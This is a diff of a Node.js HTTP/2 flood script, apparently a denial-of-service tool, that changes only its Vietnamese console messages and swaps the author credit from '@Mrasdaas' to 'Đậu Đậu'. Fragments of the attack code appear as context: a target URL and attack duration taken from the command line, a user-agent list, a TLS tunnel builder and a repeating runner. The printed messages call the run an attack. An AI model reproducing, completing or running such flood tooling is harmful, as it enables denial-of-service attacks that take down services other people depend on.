@@ -23,7 +23,7 @@ try {
 var objetive = process.argv[2];
 var parsed = url.parse(objetive);
 } catch(error){
-    console.log('  Không thể tải ngày mục tiêu.');
+    console.log('  Không thể tải mục tiêu.');
     process.exit();
 }
 const sigalgs = [
@@ -43,7 +43,7 @@ const sigalgs = [
  try {
 var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
  } catch(error){
-     console.log('  Không tải được ua.txt')
+     console.log('  Không tải được file ua.txt')
  }
 class TlsBuilder {
     constructor (socket){
@@ -53,7 +53,7 @@ class TlsBuilder {
     }
 
     Alert(){
-        console.log('  HTTP/2 Flood bởi @Mrasdaas');
+        console.log('  HTTP/2 Flood chỉnh sửa & biên dịch bởi Đậu Đậu');
     }
 
     http2TUNNEL(socket){
@@ -133,7 +133,7 @@ var req = http.get({
 setInterval(Runner)
 
 setTimeout(function(){
-    console.log('  Cuộc tấn công này đã kết thúc')
+    console.log('  Đã kết thúc cuộc tấn công')
     process.exit();
 }, process.argv[3] * 1000);
 
